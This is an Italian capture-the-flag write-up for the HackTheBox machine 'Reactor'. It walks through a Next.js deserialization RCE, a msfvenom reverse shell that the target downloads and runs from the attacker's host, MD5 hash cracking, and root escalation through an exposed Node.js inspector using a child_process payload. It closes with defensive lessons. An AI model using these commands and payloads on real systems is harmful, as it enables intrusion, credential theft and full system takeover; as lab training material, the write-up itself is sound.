# Reactor — HackTheBox Writeup

> **Difficoltà:** Facile  
> **OS:** Linux (Ubuntu 24)  
> **Categoria:** Web, Privilege Escalation  
> **CVE Coinvolte:** CVE-2025-55182

---

## Panoramica

La macchina **Reactor** ospita un'applicazione web sviluppata con il framework **Next.js** versione **15.0.3**. Questa versione specifica è affetta da una vulnerabilità critica di Remote Code Execution (RCE) pre-autenticata:
- **CVE-2025-55182** — React Flight Protocol Insecure Deserialization RCE.

L'accesso iniziale viene ottenuto sfruttando questa vulnerabilità per eseguire comandi sul server ed stabilire una reverse shell come utente `node`. Successivamente, dall'analisi del database SQLite locale `reactor.db`, si estrae l'hash MD5 della password dell'utente `engineer`. Una volta crackato l'hash, si effettua l'accesso SSH per recuperare la user flag. 

L'escalation dei privilegi a root avviene sfruttando il servizio di debugging di Node.js (Node.js Inspector) esposto sulla porta `9229` da un processo in esecuzione come root. Connettendosi al debugger locale, è possibile eseguire codice JavaScript arbitrario ed ottenere privilegi di amministrazione completi sul sistema.

---

## Fase 1 — Enumerazione

Durante la fase di ricognizione iniziale, analizzando gli header HTTP del server web, si identifica l'uso del framework Next.js:

```bash
curl -I http://reactor.htb
# X-Powered-By: Next.js
```

Analizzando i bundle JavaScript caricati dal client, si individua la versione esatta: **Next.js 15.0.3**. 

---

## Fase 2 — CVE-2025-55182: React Flight Protocol Deserialization RCE

### Dettagli Vulnerabilità

| Campo | Dettaglio |
|-------|-----------|
| **CVE** | CVE-2025-55182 (React2Shell) |
| **Tipo** | Insecure Deserialization |
| **Autenticazione** | Non richiesta (Pre-Authentication) |
| **CVSS v3.1** | 10.0 (Critico) |

**Root Cause:** La vulnerabilità risiede nella libreria `react-server-dom` (utilizzata da Next.js e altri framework per implementare i React Server Components - RSC). Il protocollo "Flight" viene impiegato per serializzare e trasmettere strutture di dati, come alberi di componenti e chiamate a Server Functions, tra client e server. Durante la deserializzazione di questi flussi di dati lato server, i pacchetti vulnerabili non validano adeguatamente la struttura dei dati in ingresso.

**Meccanismo di exploit:** Un attaccante può inviare un payload HTTP POST contenente un oggetto "Chunk" contraffatto. Definendo una proprietà personalizzata `then` all'interno dell'oggetto serializzato, l'attaccante forza il parser di React a trattarlo come una Promise. Quando il server tenta di risolvere questa Promise, esegue il metodo `then` iniettato, consentendo di dirottare lo stato del parser interno (l'oggetto `_response`) e forzare l'esecuzione di codice JavaScript arbitrario all'interno del runtime Node.js del server.

### Sfruttamento

Per ottenere l'esecuzione di codice, viene eseguito l'exploit pubblico contro l'host target:

```bash
python3 exploit.py exec -t http://reactor.htb -c "id"
# uid=1000(node) gid=1000(node)
```

L'esecuzione del comando `id` conferma che abbiamo ottenuto la RCE iniziale nel contesto dell'utente non privilegiato `node`.

---

## Fase 3 — Reverse Shell e Stabilizzazione

Per ottenere una shell interattiva, si genera un payload ELF per Linux tramite `msfvenom` sulla macchina dell'attaccante:

```bash
# Sulla macchina Kali dell'attaccante
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.162 LPORT=4444 -f elf -o shell.elf

# Avvio di un server web temporaneo per il trasferimento
python3 -m http.server 8000

# Avvio del listener Netcat
nc -lvnp 4444
```

Sfruttando la RCE di Next.js, si scarica ed esegue il payload sul server target:

```bash
python3 exploit.py exec -t http://reactor.htb -c "wget http://10.10.14.162:8000/shell.elf -O /tmp/shell.elf"
python3 exploit.py exec -t http://reactor.htb -c "chmod +x /tmp/shell.elf"
python3 exploit.py exec -t http://reactor.htb -c "/tmp/shell.elf"
```

Ricevuta la connessione sul listener, si procede alla stabilizzazione della shell per disporre di un terminale interattivo completo (TTY):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Premere Ctrl+Z per mettere in background la shell
stty raw -echo; fg
```

---

## Fase 4 — Enumerazione locale ed Estrazione Credenziali

### Esplorazione del database SQLite

Durante l'enumerazione locale nel filesystem, si individua un database SQLite denominato `reactor.db`. Utilizzando il client `sqlite3`, si interroga la tabella degli utenti:

```bash
sqlite3 reactor.db "SELECT * FROM users"
# engineer | 39d97110************************
```

> ⚠️ L'hash MD5 della password dell'utente `engineer` è stato estratto con successo ed è pari a `39d97110************************`.

### Cracking dell'hash con Hashcat

Si tenta di crackare l'hash MD5 (modalità `-m 0` in Hashcat) utilizzando il dizionario standard `rockyou.txt`:

```bash
hashcat -m 0 engineer.hash /usr/share/wordlists/rockyou.txt
# Password trovata: rea******
```

La password in chiaro associata all'utente `engineer` è `rea******`.

---

## 🚩 User Flag

Utilizzando le credenziali ottenute, si effettua l'accesso tramite SSH al server per recuperare la user flag:

```bash
ssh engineer@10.129.1.246
# Inserire password: rea******

engineer@reactor:~$ cat user.txt
3a087***************************
```

---

## Fase 5 — Privilege Escalation a Root (Node.js Inspector)

### Analisi dei Processi Attivi

Effettuando un controllo sui processi in esecuzione con privilegi elevati (root), si nota una configurazione interessante:

```bash
ps aux | grep root
# /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Un processo Node.js (`worker.js`) viene eseguito come **root** con l'argomento `--inspect=127.0.0.1:9229`. 

### Dettagli del Vettore di Attacco

Il flag `--inspect` attiva il debugger integrato di Node.js (V8 Inspector), che espone un'interfaccia di debug basata su protocollo WebSocket. 

* **Perché è vulnerabile?** Il debugger di Node.js non richiede alcuna autenticazione di default. Chiunque riesca a connettersi alla porta di debug (`9229`) ottiene l'accesso a una console JavaScript interattiva (REPL) che gira nel contesto di sicurezza del processo padre. Siccome il processo `worker.js` è eseguito da root, l'interazione con il debugger permette di eseguire comandi di sistema con privilegi amministrativi.
* **Restrizioni di rete:** Il debugger è configurato per ascoltare solo su `127.0.0.1` (localhost), prevenendo connessioni dirette dall'esterno. Tuttavia, avendo ottenuto accesso locale come utente `engineer`, possiamo connetterci direttamente alla porta locale `9229`.

### Sfruttamento del Debugger

Per prima cosa, verifichiamo lo stato del debugger tramite l'endpoint HTTP `/json` fornito da Node.js:

```bash
curl -s http://127.0.0.1:9229/json
# webSocketDebuggerUrl: ws://127.0.0.1:9229/1eccde22-...
```

Per interagire con il debugger, possiamo utilizzare il client di ispezione nativo di Node.js:

```bash
node inspect 127.0.0.1:9229
```

Una volta connessi al debugger CLI (indicato dal prompt `debug>`), possiamo valutare codice JavaScript nel contesto del processo root eseguendo il comando `exec()`:

```jsx
exec("process.mainModule.constructor._load('child_process').execSync('cat /root/root.txt').toString()")
# Risultato: 'cf7cb***************************\n'
```

#### Approfondimento del Payload:
1. `process.mainModule`: Fa riferimento al modulo principale che ha avviato l'applicazione Node.js.
2. `constructor._load()`: È un metodo interno del caricatore di moduli di Node.js. Viene preferito a `require()` perché quest'ultimo potrebbe non essere direttamente disponibile o limitato all'interno del contesto globale del debugger in esecuzione.
3. `child_process`: È il modulo nativo di Node.js utilizzato per gestire i processi figli nel sistema operativo.
4. `execSync(...)`: Esegue in modo sincrono un comando di sistema nel terminale sottostante.
5. `.toString()`: Converte il buffer binario restituito dall'esecuzione del comando in una stringa leggibile.

---

## 🚩 Root Flag

L'esecuzione del comando sul processo privilegiato restituisce il contenuto di `root.txt`:

```
cf7cb***************************
```

---

## Riepilogo dell'Attacco

```
[Riconoscimento e scansione delle porte]
        ↓
[Identificazione Next.js 15.0.3]
        ↓
[CVE-2025-55182: Deserializzazione RCE (Flight Protocol)]
        ↓
[Esecuzione codice iniziale come utente node]
        ↓
[Reverse Shell & Stabilizzazione]
        ↓
[Estrazione hash MD5 di engineer dal DB SQLite reactor.db]
        ↓
[Cracking hash via Hashcat (rockyou) -> password rea******]
        ↓
[Connessione SSH come engineer -> User Flag]
        ↓
[Identificazione del Node.js Inspector attivo come root (porta 9229)]
        ↓
[Sfruttamento Node Debugger -> RCE via child_process come root]
        ↓
[Esecuzione comando per leggere root.txt -> Root Flag]
```

---

## Tool Utilizzati

| Tool | Scopo |
|------|-------|
| `curl` | Enumerazione iniziale degli header web e verifica del debugger |
| `exploit.py` (CVE-2025-55182) | RCE iniziale tramite deserializzazione insicura Next.js |
| `msfvenom` | Generazione del payload ELF della reverse shell |
| `sqlite3` | Lettura del database locale `reactor.db` |
| `hashcat` | Cracking dell'hash MD5 per l'utente `engineer` |
| `node inspect` | Connessione al debugger locale di Node.js per privilege escalation |

---

## Lezioni Apprese

- **Aggiornamento delle dipendenze e dei framework:** Le vulnerabilità nei framework moderni (come quelle legate al React Server Components/Flight Protocol) possono esporre l'intera applicazione a RCE pre-autenticate. È fondamentale applicare tempestivamente le patch di sicurezza rilasciate per i framework web.
- **Ispezione e Debugging in Produzione:** L'uso di flag come `--inspect` o `--inspect-brk` non dovrebbe mai essere abilitato in produzione, specialmente per servizi eseguiti con privilegi amministrativi (root). Qualora sia necessario debuggare un servizio, l'accesso alla porta di debug deve essere rigidamente controllato e limitato temporaneamente tramite tunnel SSH cifrati o VPN, per poi essere disattivato al termine dell'operazione.
